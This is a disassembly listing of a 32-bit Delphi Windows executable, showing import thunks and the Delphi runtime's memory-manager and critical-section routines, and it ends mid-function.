Function: GetStdHandle
  00401000: jmp     ds:__imp_GetStdHandle

Function: RaiseException
  00401008: jmp     ds:__imp_RaiseException

Function: RtlUnwind
  00401010: jmp     ds:__imp_RtlUnwind

Function: UnhandledExceptionFilter
  00401018: jmp     ds:__imp_UnhandledExceptionFilter

Function: WriteFile
  00401020: jmp     ds:__imp_WriteFile

Function: ExitProcess
  00401028: jmp     ds:__imp_ExitProcess

Function: MessageBoxA
  00401030: jmp     ds:__imp_MessageBoxA

Function: FreeLibrary
  00401038: jmp     ds:__imp_FreeLibrary

Function: GetCommandLineA
  00401040: jmp     ds:__imp_GetCommandLineA

Function: GetLocaleInfoA
  00401048: jmp     ds:__imp_GetLocaleInfoA

Function: GetStartupInfoA
  00401050: jmp     ds:__imp_GetStartupInfoA

Function: GetThreadLocale
  00401058: jmp     ds:__imp_GetThreadLocale

Function: RegCloseKey
  00401060: jmp     ds:__imp_RegCloseKey

Function: RegOpenKeyExA
  00401068: jmp     ds:__imp_RegOpenKeyExA

Function: RegQueryValueExA
  00401070: jmp     ds:__imp_RegQueryValueExA

Function: GetCurrentThreadId
  00401078: jmp     ds:__imp_GetCurrentThreadId

Function: GetVersion
  00401080: jmp     ds:__imp_GetVersion

Function: unknown_libname_1
  00401088: push    ebx
  00401089: add     esp, 0FFFFFFBCh
  0040108C: mov     ebx, 0Ah
  00401091: push    esp; lpStartupInfo
  00401092: call    GetStartupInfoA
  00401097: test    [esp+48h+var_1C], 1
  0040109C: jz      short loc_4010A3
  0040109E: movzx   ebx, [esp+48h+var_18]
  004010A3: mov     eax, ebx
  004010A5: add     esp, 44h
  004010A8: pop     ebx
  004010A9: retn

Function: LocalAlloc
  004010AC: jmp     ds:__imp_LocalAlloc

Function: LocalFree
  004010B4: jmp     ds:__imp_LocalFree

Function: VirtualAlloc
  004010BC: jmp     ds:__imp_VirtualAlloc

Function: VirtualFree
  004010C4: jmp     ds:__imp_VirtualFree

Function: InitializeCriticalSection
  004010CC: jmp     ds:__imp_InitializeCriticalSection

Function: EnterCriticalSection
  004010D4: jmp     ds:__imp_EnterCriticalSection

Function: LeaveCriticalSection
  004010DC: jmp     ds:__imp_LeaveCriticalSection

Function: DeleteCriticalSection
  004010E4: jmp     ds:__imp_DeleteCriticalSection

Function: unknown_libname_2
  004010EC: push    ebx
  004010ED: push    esi
  004010EE: mov     esi, offset dword_4065D0
  004010F3: cmp     dword ptr [esi], 0
  004010F6: jnz     short loc_401132
  004010F8: push    644h; uBytes
  004010FD: push    0; uFlags
  004010FF: call    LocalAlloc
  00401104: mov     ecx, eax
  00401106: test    ecx, ecx
  00401108: jnz     short loc_40110F
  0040110A: xor     eax, eax
  0040110C: pop     esi
  0040110D: pop     ebx
  0040110E: retn
  0040110F: mov     eax, ds:dword_4065CC
  00401114: mov     [ecx], eax
  00401116: mov     ds:dword_4065CC, ecx
  0040111C: xor     edx, edx
  0040111E: mov     eax, edx
  00401120: add     eax, eax
  00401122: lea     eax, [ecx+eax*8+4]
  00401126: mov     ebx, [esi]
  00401128: mov     [eax], ebx
  0040112A: mov     [esi], eax
  0040112C: inc     edx
  0040112D: cmp     edx, 64h ; 'd'
  00401130: jnz     short loc_40111E
  00401132: mov     eax, [esi]
  00401134: mov     edx, [eax]
  00401136: mov     [esi], edx
  00401138: pop     esi
  00401139: pop     ebx
  0040113A: retn

Function: sub_40113C
  0040113C: mov     [eax], eax
  0040113E: mov     [eax+4], eax
  00401141: retn

Function: unknown_libname_3
  00401144: push    ebx
  00401145: push    esi
  00401146: mov     esi, edx
  00401148: mov     ebx, eax
  0040114A: call    unknown_libname_2; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040114F: test    eax, eax
  00401151: jnz     short loc_401158
  00401153: xor     eax, eax
  00401155: pop     esi
  00401156: pop     ebx
  00401157: retn
  00401158: mov     edx, [esi]
  0040115A: mov     [eax+8], edx
  0040115D: mov     edx, [esi+4]
  00401160: mov     [eax+0Ch], edx
  00401163: mov     edx, [ebx]
  00401165: mov     [eax], edx
  00401167: mov     [eax+4], ebx
  0040116A: mov     [edx+4], eax
  0040116D: mov     [ebx], eax
  0040116F: mov     al, 1
  00401171: pop     esi
  00401172: pop     ebx
  00401173: retn

Function: unknown_libname_4
  00401174: mov     edx, [eax+4]
  00401177: mov     ecx, [eax]
  00401179: mov     [edx], ecx
  0040117B: mov     [ecx+4], edx
  0040117E: mov     edx, ds:dword_4065D0
  00401184: mov     [eax], edx
  00401186: mov     ds:dword_4065D0, eax
  0040118B: retn

Function: @System@_16456
  0040118C: push    ebx
  0040118D: push    esi
  0040118E: push    edi
  0040118F: push    ebp
  00401190: push    ecx
  00401191: mov     esi, ecx
  00401193: mov     [esp+14h+var_14], edx
  00401196: mov     ebp, eax
  00401198: mov     ebx, [ebp+0]
  0040119B: mov     eax, [esp+14h+var_14]
  0040119E: mov     edx, [eax]
  004011A0: mov     [esi], edx
  004011A2: mov     edx, [eax+4]
  004011A5: mov     [esi+4], edx
  004011A8: mov     edi, [ebx]
  004011AA: mov     eax, [esi]
  004011AC: mov     edx, [ebx+8]
  004011AF: add     edx, [ebx+0Ch]
  004011B2: cmp     eax, edx
  004011B4: jnz     short loc_4011CA
  004011B6: mov     eax, ebx
  004011B8: call    unknown_libname_4; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004011BD: mov     eax, [ebx+8]
  004011C0: mov     [esi], eax
  004011C2: mov     eax, [ebx+0Ch]
  004011C5: add     [esi+4], eax
  004011C8: jmp     short loc_4011DF
  004011CA: add     eax, [esi+4]
  004011CD: cmp     eax, [ebx+8]
  004011D0: jnz     short loc_4011DF
  004011D2: mov     eax, ebx
  004011D4: call    unknown_libname_4; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004011D9: mov     eax, [ebx+0Ch]
  004011DC: add     [esi+4], eax
  004011DF: mov     ebx, edi
  004011E1: cmp     ebp, ebx
  004011E3: jnz     short loc_4011A8
  004011E5: mov     edx, esi
  004011E7: mov     eax, ebp
  004011E9: call    unknown_libname_3; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004011EE: test    al, al
  004011F0: jnz     short loc_4011F6
  004011F2: xor     eax, eax
  004011F4: mov     [esi], eax
  004011F6: pop     edx
  004011F7: pop     ebp
  004011F8: pop     edi
  004011F9: pop     esi
  004011FA: pop     ebx
  004011FB: retn

Function: @System@_16457
  004011FC: push    ebx
  004011FD: push    esi
  004011FE: push    edi
  004011FF: push    ebp
  00401200: add     esp, 0FFFFFFF8h
  00401203: mov     ebx, eax
  00401205: mov     edi, ebx
  00401207: mov     esi, [edx]
  00401209: mov     eax, [ebx+8]
  0040120C: cmp     esi, eax
  0040120E: jb      short loc_401280
  00401210: mov     ecx, esi
  00401212: add     ecx, [edx+4]
  00401215: mov     ebp, eax
  00401217: add     ebp, [ebx+0Ch]
  0040121A: cmp     ecx, ebp
  0040121C: ja      short loc_401280
  0040121E: cmp     esi, eax
  00401220: jnz     short loc_40123D
  00401222: mov     eax, [edx+4]
  00401225: add     [ebx+8], eax
  00401228: mov     eax, [edx+4]
  0040122B: sub     [ebx+0Ch], eax
  0040122E: cmp     dword ptr [ebx+0Ch], 0
  00401232: jnz     short loc_40127C
  00401234: mov     eax, ebx
  00401236: call    unknown_libname_4; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040123B: jmp     short loc_40127C
  0040123D: mov     ecx, esi
  0040123F: mov     edi, [edx+4]
  00401242: add     ecx, edi
  00401244: mov     ebp, eax
  00401246: add     ebp, [ebx+0Ch]
  00401249: cmp     ecx, ebp
  0040124B: jnz     short loc_401252
  0040124D: sub     [ebx+0Ch], edi
  00401250: jmp     short loc_40127C
  00401252: mov     ecx, [edx]
  00401254: add     ecx, [edx+4]
  00401257: mov     [esp+18h+var_18], ecx
  0040125A: mov     edi, [ebx+8]
  0040125D: add     edi, [ebx+0Ch]
  00401260: sub     edi, ecx
  00401262: mov     [esp+18h+var_14], edi
  00401266: sub     esi, eax
  00401268: mov     [ebx+0Ch], esi
  0040126B: mov     edx, esp
  0040126D: mov     eax, ebx
  0040126F: call    unknown_libname_3; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401274: test    al, al
  00401276: jnz     short loc_40127C
  00401278: xor     eax, eax
  0040127A: jmp     short loc_401288
  0040127C: mov     al, 1
  0040127E: jmp     short loc_401288
  00401280: mov     ebx, [ebx]
  00401282: cmp     edi, ebx
  00401284: jnz     short loc_401207
  00401286: xor     eax, eax
  00401288: pop     ecx
  00401289: pop     edx
  0040128A: pop     ebp
  0040128B: pop     edi
  0040128C: pop     esi
  0040128D: pop     ebx
  0040128E: retn

Function: unknown_libname_5
  00401290: push    ebx
  00401291: push    esi
  00401292: push    edi
  00401293: mov     ebx, edx
  00401295: mov     esi, eax
  00401297: cmp     esi, 100000h
  0040129D: jge     short loc_4012A6
  0040129F: mov     esi, 100000h
  004012A4: jmp     short loc_4012B2
  004012A6: add     esi, 0FFFFh
  004012AC: and     esi, 0FFFF0000h
  004012B2: mov     [ebx+4], esi
  004012B5: push    1; flProtect
  004012B7: push    2000h; flAllocationType
  004012BC: push    esi; dwSize
  004012BD: push    0; lpAddress
  004012BF: call    VirtualAlloc
  004012C4: mov     edi, eax
  004012C6: mov     [ebx], edi
  004012C8: test    edi, edi
  004012CA: jz      short loc_4012EF
  004012CC: mov     edx, ebx
  004012CE: mov     eax, offset dword_4065D4
  004012D3: call    unknown_libname_3; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004012D8: test    al, al
  004012DA: jnz     short loc_4012EF
  004012DC: push    8000h; dwFreeType
  004012E1: push    0; dwSize
  004012E3: mov     eax, [ebx]
  004012E5: push    eax; lpAddress
  004012E6: call    VirtualFree
  004012EB: xor     eax, eax
  004012ED: mov     [ebx], eax
  004012EF: pop     edi
  004012F0: pop     esi
  004012F1: pop     ebx
  004012F2: retn

Function: unknown_libname_6
  004012F4: push    ebx
  004012F5: push    esi
  004012F6: push    edi
  004012F7: push    ebp
  004012F8: mov     ebx, ecx
  004012FA: mov     esi, edx
  004012FC: mov     ebp, eax
  004012FE: mov     dword ptr [ebx+4], 100000h
  00401305: push    4; flProtect
  00401307: push    2000h; flAllocationType
  0040130C: push    100000h; dwSize
  00401311: push    ebp; lpAddress
  00401312: call    VirtualAlloc
  00401317: mov     edi, eax
  00401319: mov     [ebx], edi
  0040131B: test    edi, edi
  0040131D: jnz     short loc_40133E
  0040131F: add     esi, 0FFFFh
  00401325: and     esi, 0FFFF0000h
  0040132B: mov     [ebx+4], esi
  0040132E: push    4; flProtect
  00401330: push    2000h; flAllocationType
  00401335: push    esi; dwSize
  00401336: push    ebp; lpAddress
  00401337: call    VirtualAlloc
  0040133C: mov     [ebx], eax
  0040133E: cmp     dword ptr [ebx], 0
  00401341: jz      short loc_401366
  00401343: mov     edx, ebx
  00401345: mov     eax, offset dword_4065D4
  0040134A: call    unknown_libname_3; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040134F: test    al, al
  00401351: jnz     short loc_401366
  00401353: push    8000h; dwFreeType
  00401358: push    0; dwSize
  0040135A: mov     eax, [ebx]
  0040135C: push    eax; lpAddress
  0040135D: call    VirtualFree
  00401362: xor     eax, eax
  00401364: mov     [ebx], eax
  00401366: pop     ebp
  00401367: pop     edi
  00401368: pop     esi
  00401369: pop     ebx
  0040136A: retn

Function: @System@_16441
  0040136C: push    ebx
  0040136D: push    esi
  0040136E: push    edi
  0040136F: push    ebp
  00401370: add     esp, 0FFFFFFECh
  00401373: mov     [esp+24h+var_20], ecx
  00401377: mov     [esp+24h+var_24], edx
  0040137A: mov     [esp+24h+var_1C], 0FFFFFFFFh
  00401382: xor     edx, edx
  00401384: mov     [esp+24h+var_18], edx
  00401388: mov     ebp, eax
  0040138A: mov     eax, [esp+24h+var_24]
  0040138D: add     eax, ebp
  0040138F: mov     [esp+24h+var_14], eax
  00401393: mov     ebx, ds:dword_4065D4
  00401399: jmp     short loc_4013EC
  0040139B: mov     edi, [ebx]
  0040139D: mov     esi, [ebx+8]
  004013A0: cmp     ebp, esi
  004013A2: ja      short loc_4013EA
  004013A4: mov     eax, esi
  004013A6: add     eax, [ebx+0Ch]
  004013A9: cmp     eax, [esp+24h+var_14]
  004013AD: ja      short loc_4013EA
  004013AF: cmp     esi, [esp+24h+var_1C]
  004013B3: jnb     short loc_4013B9
  004013B5: mov     [esp+24h+var_1C], esi
  004013B9: mov     eax, esi
  004013BB: add     eax, [ebx+0Ch]
  004013BE: cmp     eax, [esp+24h+var_18]
  004013C2: jbe     short loc_4013C8
  004013C4: mov     [esp+24h+var_18], eax
  004013C8: push    8000h; dwFreeType
  004013CD: push    0; dwSize
  004013CF: push    esi; lpAddress
  004013D0: call    VirtualFree
  004013D5: test    eax, eax
  004013D7: jnz     short loc_4013E3
  004013D9: mov     ds:dword_4065B0, 1
  004013E3: mov     eax, ebx
  004013E5: call    unknown_libname_4; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004013EA: mov     ebx, edi
  004013EC: cmp     ebx, offset dword_4065D4
  004013F2: jnz     short loc_40139B
  004013F4: mov     eax, [esp+24h+var_20]
  004013F8: xor     edx, edx
  004013FA: mov     [eax], edx
  004013FC: cmp     [esp+24h+var_18], 0
  00401401: jz      short loc_40141C
  00401403: mov     eax, [esp+24h+var_20]
  00401407: mov     edx, [esp+24h+var_1C]
  0040140B: mov     [eax], edx
  0040140D: mov     eax, [esp+24h+var_18]
  00401411: sub     eax, [esp+24h+var_1C]
  00401415: mov     edx, [esp+24h+var_20]
  00401419: mov     [edx+4], eax
  0040141C: add     esp, 14h
  0040141F: pop     ebp
  00401420: pop     edi
  00401421: pop     esi
  00401422: pop     ebx
  00401423: retn

Function: unknown_libname_7
  00401424: push    ebx
  00401425: push    esi
  00401426: push    edi
  00401427: push    ebp
  00401428: add     esp, 0FFFFFFF4h
  0040142B: mov     [esp+1Ch+var_18], ecx
  0040142F: mov     [esp+1Ch+var_1C], edx
  00401432: mov     edx, eax
  00401434: mov     ebp, edx
  00401436: and     ebp, 0FFFFF000h
  0040143C: add     edx, [esp+1Ch+var_1C]
  0040143F: add     edx, 0FFFh
  00401445: and     edx, 0FFFFF000h
  0040144B: mov     [esp+1Ch+var_14], edx
  0040144F: mov     eax, [esp+1Ch+var_18]
  00401453: mov     [eax], ebp
  00401455: mov     eax, [esp+1Ch+var_14]
  00401459: sub     eax, ebp
  0040145B: mov     edx, [esp+1Ch+var_18]
  0040145F: mov     [edx+4], eax
  00401462: mov     esi, ds:dword_4065D4
  00401468: jmp     short loc_4014A6
  0040146A: mov     ebx, [esi+8]
  0040146D: mov     edi, [esi+0Ch]
  00401470: add     edi, ebx
  00401472: cmp     ebp, ebx
  00401474: jbe     short loc_401478
  00401476: mov     ebx, ebp
  00401478: cmp     edi, [esp+1Ch+var_14]
  0040147C: jbe     short loc_401482
  0040147E: mov     edi, [esp+1Ch+var_14]
  00401482: cmp     edi, ebx
  00401484: jbe     short loc_4014A4
  00401486: push    4; flProtect
  00401488: push    1000h; flAllocationType
  0040148D: sub     edi, ebx
  0040148F: push    edi; dwSize
  00401490: push    ebx; lpAddress
  00401491: call    VirtualAlloc
  00401496: test    eax, eax
  00401498: jnz     short loc_4014A4
  0040149A: mov     eax, [esp+1Ch+var_18]
  0040149E: xor     edx, edx
  004014A0: mov     [eax], edx
  004014A2: jmp     short loc_4014AE
  004014A4: mov     esi, [esi]
  004014A6: cmp     esi, offset dword_4065D4
  004014AC: jnz     short loc_40146A
  004014AE: add     esp, 0Ch
  004014B1: pop     ebp
  004014B2: pop     edi
  004014B3: pop     esi
  004014B4: pop     ebx
  004014B5: retn

Function: unknown_libname_8
  004014B8: push    ebx
  004014B9: push    esi
  004014BA: push    edi
  004014BB: push    ebp
  004014BC: push    ecx
  004014BD: mov     ebx, eax
  004014BF: mov     esi, ebx
  004014C1: add     esi, 0FFFh
  004014C7: and     esi, 0FFFFF000h
  004014CD: mov     [esp+14h+var_14], esi
  004014D0: mov     ebp, ebx
  004014D2: add     ebp, edx
  004014D4: and     ebp, 0FFFFF000h
  004014DA: mov     eax, [esp+14h+var_14]
  004014DD: mov     [ecx], eax
  004014DF: mov     eax, ebp
  004014E1: sub     eax, [esp+14h+var_14]
  004014E4: mov     [ecx+4], eax
  004014E7: mov     esi, ds:dword_4065D4
  004014ED: jmp     short loc_401527
  004014EF: mov     ebx, [esi+8]
  004014F2: mov     edi, [esi+0Ch]
  004014F5: add     edi, ebx
  004014F7: cmp     ebx, [esp+14h+var_14]
  004014FA: jnb     short loc_4014FF
  004014FC: mov     ebx, [esp+14h+var_14]
  004014FF: cmp     ebp, edi
  00401501: jnb     short loc_401505
  00401503: mov     edi, ebp
  00401505: cmp     edi, ebx
  00401507: jbe     short loc_401525
  00401509: push    4000h; dwFreeType
  0040150E: sub     edi, ebx
  00401510: push    edi; dwSize
  00401511: push    ebx; lpAddress
  00401512: call    VirtualFree
  00401517: test    eax, eax
  00401519: jnz     short loc_401525
  0040151B: mov     ds:dword_4065B0, 2
  00401525: mov     esi, [esi]
  00401527: cmp     esi, offset dword_4065D4
  0040152D: jnz     short loc_4014EF
  0040152F: pop     edx
  00401530: pop     ebp
  00401531: pop     edi
  00401532: pop     esi
  00401533: pop     ebx
  00401534: retn

Function: unknown_libname_9
  00401538: push    ebx
  00401539: push    esi
  0040153A: push    edi
  0040153B: push    ebp
  0040153C: add     esp, 0FFFFFFF8h
  0040153F: mov     esi, edx
  00401541: mov     edi, eax
  00401543: mov     ebp, offset unk_65E4
  00401548: add     edi, 3FFFh
  0040154E: and     edi, 0FFFFC000h
  00401554: mov     ebx, [ebp+0]
  00401557: jmp     short loc_40158C
  00401559: cmp     edi, [ebx+0Ch]
  0040155C: jg      short loc_40158A
  0040155E: mov     ecx, esi
  00401560: mov     edx, edi
  00401562: mov     eax, [ebx+8]
  00401565: call    unknown_libname_7; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040156A: cmp     dword ptr [esi], 0
  0040156D: jz      short loc_4015BF
  0040156F: mov     eax, [esi+4]
  00401572: add     [ebx+8], eax
  00401575: mov     eax, [esi+4]
  00401578: sub     [ebx+0Ch], eax
  0040157B: cmp     dword ptr [ebx+0Ch], 0
  0040157F: jnz     short loc_4015BF
  00401581: mov     eax, ebx
  00401583: call    unknown_libname_4; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401588: jmp     short loc_4015BF
  0040158A: mov     ebx, [ebx]
  0040158C: cmp     ebx, ebp
  0040158E: jnz     short loc_401559
  00401590: mov     edx, esi
  00401592: mov     eax, edi
  00401594: call    unknown_libname_5; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401599: cmp     dword ptr [esi], 0
  0040159C: jz      short loc_4015BF
  0040159E: mov     ecx, esp
  004015A0: mov     edx, esi
  004015A2: mov     eax, ebp
  004015A4: call    @System@_16456; System::_16456
  004015A9: cmp     [esp+18h+var_18], 0
  004015AD: jnz     short loc_401554
  004015AF: mov     ecx, esp
  004015B1: mov     edx, [esi+4]
  004015B4: mov     eax, [esi]
  004015B6: call    @System@_16441; System::_16441
  004015BB: xor     eax, eax
  004015BD: mov     [esi], eax
  004015BF: pop     ecx
  004015C0: pop     edx
  004015C1: pop     ebp
  004015C2: pop     edi
  004015C3: pop     esi
  004015C4: pop     ebx
  004015C5: retn

Function: unknown_libname_10
  004015C8: push    ebx
  004015C9: push    esi
  004015CA: push    edi
  004015CB: push    ebp
  004015CC: add     esp, 0FFFFFFECh
  004015CF: mov     [esp+24h+var_24], ecx
  004015D2: mov     edi, edx
  004015D4: mov     esi, eax
  004015D6: mov     ebp, offset unk_65E4
  004015DB: add     edi, 3FFFh
  004015E1: and     edi, 0FFFFC000h
  004015E7: mov     ebx, [ebp+0]
  004015EA: jmp     short loc_4015EE
  004015EC: mov     ebx, [ebx]
  004015EE: cmp     ebx, ebp
  004015F0: jz      short loc_4015F7
  004015F2: cmp     esi, [ebx+8]
  004015F5: jnz     short loc_4015EC
  004015F7: cmp     esi, [ebx+8]
  004015FA: jnz     short loc_401653
  004015FC: cmp     edi, [ebx+0Ch]
  004015FF: jle     loc_40169B
  00401605: lea     ecx, [esp+24h+var_20]
  00401609: mov     edx, edi
  0040160B: sub     edx, [ebx+0Ch]
  0040160E: mov     eax, [ebx+8]
  00401611: add     eax, [ebx+0Ch]; lpAddress
  00401614: call    unknown_libname_6; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401619: cmp     [esp+24h+var_20], 0
  0040161E: jz      short loc_401653
  00401620: lea     ecx, [esp+24h+var_18]
  00401624: lea     edx, [esp+24h+var_20]
  00401628: mov     eax, ebp
  0040162A: call    @System@_16456; System::_16456
  0040162F: cmp     [esp+24h+var_18], 0
  00401634: jnz     short loc_4015E7
  00401636: lea     ecx, [esp+24h+var_18]
  0040163A: mov     edx, [esp+24h+var_1C]
  0040163E: mov     eax, [esp+24h+var_20]
  00401642: call    @System@_16441; System::_16441
  00401647: mov     eax, [esp+24h+var_24]
  0040164A: xor     edx, edx
  0040164C: mov     [eax], edx
  0040164E: jmp     loc_4016E3
  00401653: lea     ecx, [esp+24h+var_20]
  00401657: mov     edx, edi
  00401659: mov     eax, esi; lpAddress
  0040165B: call    unknown_libname_6; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401660: cmp     [esp+24h+var_20], 0
  00401665: jz      short loc_40169B
  00401667: lea     ecx, [esp+24h+var_18]
  0040166B: lea     edx, [esp+24h+var_20]
  0040166F: mov     eax, ebp
  00401671: call    @System@_16456; System::_16456
  00401676: cmp     [esp+24h+var_18], 0
  0040167B: jnz     loc_4015E7
  00401681: lea     ecx, [esp+24h+var_18]
  00401685: mov     edx, [esp+24h+var_1C]
  00401689: mov     eax, [esp+24h+var_20]
  0040168D: call    @System@_16441; System::_16441
  00401692: mov     eax, [esp+24h+var_24]
  00401695: xor     edx, edx
  00401697: mov     [eax], edx
  00401699: jmp     short loc_4016E3
  0040169B: mov     ebp, [ebx+8]
  0040169E: cmp     esi, ebp
  004016A0: jnz     short loc_4016DC
  004016A2: cmp     edi, [ebx+0Ch]
  004016A5: jg      short loc_4016DC
  004016A7: mov     ecx, [esp+24h+var_24]
  004016AA: mov     edx, edi
  004016AC: mov     eax, ebp
  004016AE: call    unknown_libname_7; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004016B3: mov     eax, [esp+24h+var_24]
  004016B6: cmp     dword ptr [eax], 0
  004016B9: jz      short loc_4016E3
  004016BB: mov     eax, [esp+24h+var_24]
  004016BE: mov     eax, [eax+4]
  004016C1: add     [ebx+8], eax
  004016C4: mov     eax, [esp+24h+var_24]
  004016C7: mov     eax, [eax+4]
  004016CA: sub     [ebx+0Ch], eax
  004016CD: cmp     dword ptr [ebx+0Ch], 0
  004016D1: jnz     short loc_4016E3
  004016D3: mov     eax, ebx
  004016D5: call    unknown_libname_4; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004016DA: jmp     short loc_4016E3
  004016DC: mov     eax, [esp+24h+var_24]
  004016DF: xor     edx, edx
  004016E1: mov     [eax], edx
  004016E3: add     esp, 14h
  004016E6: pop     ebp
  004016E7: pop     edi
  004016E8: pop     esi
  004016E9: pop     ebx
  004016EA: retn

Function: unknown_libname_11
  004016EC: push    ebx
  004016ED: push    esi
  004016EE: push    edi
  004016EF: add     esp, 0FFFFFFECh
  004016F2: mov     edi, ecx
  004016F4: mov     [esp+20h+var_20], edx
  004016F7: lea     ebx, [eax+3FFFh]
  004016FD: and     ebx, 0FFFFC000h
  00401703: mov     esi, [esp+20h+var_20]
  00401706: add     esi, eax
  00401708: and     esi, 0FFFFC000h
  0040170E: cmp     ebx, esi
  00401710: jnb     short loc_40176D
  00401712: mov     ecx, edi
  00401714: mov     edx, esi
  00401716: sub     edx, ebx
  00401718: mov     eax, ebx
  0040171A: call    unknown_libname_8; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040171F: lea     ecx, [esp+20h+var_1C]
  00401723: mov     edx, edi
  00401725: mov     eax, offset unk_65E4
  0040172A: call    @System@_16456; System::_16456
  0040172F: mov     ebx, [esp+20h+var_1C]
  00401733: test    ebx, ebx
  00401735: jz      short loc_401756
  00401737: lea     ecx, [esp+20h+var_14]
  0040173B: mov     edx, [esp+20h+var_18]
  0040173F: mov     eax, ebx
  00401741: call    @System@_16441; System::_16441
  00401746: mov     eax, [esp+20h+var_14]
  0040174A: mov     [esp+20h+var_1C], eax
  0040174E: mov     eax, [esp+20h+var_10]
  00401752: mov     [esp+20h+var_18], eax
  00401756: cmp     [esp+20h+var_1C], 0
  0040175B: jz      short loc_401771
  0040175D: lea     edx, [esp+20h+var_1C]
  00401761: mov     eax, offset unk_65E4
  00401766: call    @System@_16457; System::_16457
  0040176B: jmp     short loc_401771
  0040176D: xor     eax, eax
  0040176F: mov     [edi], eax
  00401771: add     esp, 14h
  00401774: pop     edi
  00401775: pop     esi
  00401776: pop     ebx
  00401777: retn

Function: @System@_16447
  00401778: push    ebp
  00401779: mov     ebp, esp
  0040177B: xor     edx, edx
  0040177D: push    ebp
  0040177E: push    offset loc_40182E
  00401783: push    dword ptr fs:[edx]
  00401786: mov     fs:[edx], esp
  00401789: push    offset CriticalSection; lpCriticalSection
  0040178E: call    InitializeCriticalSection
  00401793: cmp     ds:byte_6035, 0
  0040179A: jz      short loc_4017A6
  0040179C: push    offset CriticalSection; lpCriticalSection
  004017A1: call    EnterCriticalSection
  004017A6: mov     eax, offset dword_4065D4
  004017AB: call    sub_40113C
  004017B0: mov     eax, offset unk_65E4
  004017B5: call    sub_40113C
  004017BA: mov     eax, offset dword_406610
  004017BF: call    sub_40113C
  004017C4: push    0FF8h; uBytes
  004017C9: push    0; uFlags
  004017CB: call    LocalAlloc
  004017D0: mov     ds:hMem, eax
  004017D5: cmp     ds:hMem, 0
  004017DC: jz      short loc_40180D
  004017DE: mov     eax, 3
  004017E3: mov     edx, ds:hMem
  004017E9: xor     ecx, ecx
  004017EB: mov     [edx+eax*4-0Ch], ecx
  004017EF: inc     eax
  004017F0: cmp     eax, 401h
  004017F5: jnz     short loc_4017E3
  004017F7: mov     eax, offset unk_65F4
  004017FC: mov     [eax+4], eax
  004017FF: mov     [eax], eax
  00401801: mov     ds:dword_406600, eax
  00401806: mov     ds:byte_65AC, 1
  0040180D: xor     eax, eax
  0040180F: pop     edx
  00401810: pop     ecx
  00401811: pop     ecx
  00401812: mov     fs:[eax], edx
  00401815: push    offset loc_401835
  0040181A: cmp     ds:byte_6035, 0
  00401821: jz      short loc_40182D
  00401823: push    offset CriticalSection; lpCriticalSection
  00401828: call    LeaveCriticalSection
  0040182D: retn
  0040182E: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401833: jmp     short loc_40181A
  00401835: mov     al, ds:byte_65AC
  0040183A: pop     ebp
  0040183B: retn

Function: @System@_16448
  0040183C: push    ebp
  0040183D: mov     ebp, esp
  0040183F: push    ebx
  00401840: cmp     ds:byte_65AC, 0
  00401847: jz      loc_401919
  0040184D: xor     edx, edx
  0040184F: push    ebp
  00401850: push    offset loc_401912
  00401855: push    dword ptr fs:[edx]
  00401858: mov     fs:[edx], esp
  0040185B: cmp     ds:byte_6035, 0
  00401862: jz      short loc_40186E
  00401864: push    offset CriticalSection; lpCriticalSection
  00401869: call    EnterCriticalSection
  0040186E: mov     ds:byte_65AC, 0
  00401875: mov     eax, ds:hMem
  0040187A: push    eax; hMem
  0040187B: call    LocalFree
  00401880: xor     eax, eax
  00401882: mov     ds:hMem, eax
  00401887: mov     ebx, ds:dword_4065D4
  0040188D: jmp     short loc_4018A1
  0040188F: push    8000h; dwFreeType
  00401894: push    0; dwSize
  00401896: mov     eax, [ebx+8]
  00401899: push    eax; lpAddress
  0040189A: call    VirtualFree
  0040189F: mov     ebx, [ebx]
  004018A1: cmp     ebx, offset dword_4065D4
  004018A7: jnz     short loc_40188F
  004018A9: mov     eax, offset dword_4065D4
  004018AE: call    sub_40113C
  004018B3: mov     eax, offset unk_65E4
  004018B8: call    sub_40113C
  004018BD: mov     eax, offset dword_406610
  004018C2: call    sub_40113C
  004018C7: mov     eax, ds:dword_4065CC
  004018CC: test    eax, eax
  004018CE: jz      short loc_4018E7
  004018D0: mov     edx, [eax]
  004018D2: mov     ds:dword_4065CC, edx
  004018D8: push    eax; hMem
  004018D9: call    LocalFree
  004018DE: mov     eax, ds:dword_4065CC
  004018E3: test    eax, eax
  004018E5: jnz     short loc_4018D0
  004018E7: xor     eax, eax
  004018E9: pop     edx
  004018EA: pop     ecx
  004018EB: pop     ecx
  004018EC: mov     fs:[eax], edx
  004018EF: push    offset loc_401919
  004018F4: cmp     ds:byte_6035, 0
  004018FB: jz      short loc_401907
  004018FD: push    offset CriticalSection; lpCriticalSection
  00401902: call    LeaveCriticalSection
  00401907: push    offset CriticalSection; lpCriticalSection
  0040190C: call    DeleteCriticalSection
  00401911: retn
  00401912: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401917: jmp     short loc_4018F4
  00401919: pop     ebx
  0040191A: pop     ebp
  0040191B: retn

Function: unknown_libname_12
  0040191C: push    ebx
  0040191D: cmp     eax, ds:dword_406600
  00401923: jnz     short loc_40192E
  00401925: mov     edx, [eax+4]
  00401928: mov     ds:dword_406600, edx
  0040192E: mov     edx, [eax+4]
  00401931: mov     ecx, [eax+8]
  00401934: cmp     ecx, 1000h
  0040193A: jg      short loc_401974
  0040193C: cmp     eax, edx
  0040193E: jnz     short loc_401957
  00401940: test    ecx, ecx
  00401942: jns     short loc_401947
  00401944: add     ecx, 3
  00401947: sar     ecx, 2
  0040194A: mov     eax, ds:hMem
  0040194F: xor     edx, edx
  00401951: mov     [eax+ecx*4-0Ch], edx
